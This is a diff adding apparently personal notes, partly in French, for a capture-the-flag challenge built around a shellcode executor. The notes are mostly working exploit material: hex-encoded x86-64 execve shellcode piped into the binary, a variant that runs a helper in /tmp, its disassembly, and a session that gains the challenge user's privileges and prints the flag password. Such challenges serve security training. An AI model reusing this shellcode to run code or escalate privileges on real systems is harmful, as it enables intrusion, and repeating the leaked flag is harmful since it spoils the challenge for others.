@@ -1,0 +1,62 @@
+programmation-ch12-cracked:x:1155:1155::/challenge/programmation/ch12:/bin/bash
+
+pour mettre /bin/sh dans le shell.s le mettre à l'envers et rajouter un / pour que cela rentre dans les 8 octets.
+
+echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" | ./ch12
+Problem: the program is closing instantly
+
+(echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" ; cat) | ./ch12
+Problems: doesn't have the good rights
+
+gcc -o aa shell.c
+mv aa ../
+
+changer le call de /bin/sh par /tmp/aa dans le shell.s
+
+cc -Wall -m64 -nostdlib -c shell.s
+ld -N -o shell shell.o
+
+programmation-ch12@challenge01:/tmp/thibault$ objdump -d shell 
+
+shell:     format de fichier elf64-x86-64
+
+
+Déassemblage de la section .text :
+
+0000000000400078 <_start>:
+  400078:       eb 07                   jmp    400081 <skip_instructions>
+  40007a:       90                      nop
+  40007b:       90                      nop
+  40007c:       90                      nop
+  40007d:       90                      nop
+  40007e:       90                      nop
+  40007f:       90                      nop
+  400080:       90                      nop
+
+0000000000400081 <skip_instructions>:
+  400081:       6a 3b                   pushq  $0x3b
+  400083:       58                      pop    %rax
+  400084:       48 31 d2                xor    %rdx,%rdx
+  400087:       49 b8 2f 2f 74 6d 70    movabs $0x61612f706d742f2f,%r8
+  40008e:       2f 61 61 
+  400091:       49 c1 e8 08             shr    $0x8,%r8
+  400095:       41 50                   push   %r8
+  400097:       48 89 e7                mov    %rsp,%rdi
+  40009a:       52                      push   %rdx
+  40009b:       57                      push   %rdi
+  40009c:       48 89 e6                mov    %rsp,%rsi
+  40009f:       0f 05                   syscall 
+  4000a1:       6a 3c                   pushq  $0x3c
+  4000a3:       58                      pop    %rax
+  4000a4:       48 31 ff                xor    %rdi,%rdi
+  4000a7:       0f 05                   syscall
+
+programmation-ch12@challenge01:~$ (echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x74\x6d\x70\x2f\x61\x61\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" ;cat) | ./ch12
+===== Basic Shellcode Executor =====
+Input shellcode: ls
+Makefile  ch12  ch12.s
+id
+uid=1155(programmation-ch12-cracked) gid=1154(programmation-ch12) groups=1154(programmation-ch12),100(users)
+cat .passwd
+$4utE-M0U70N5
+exit
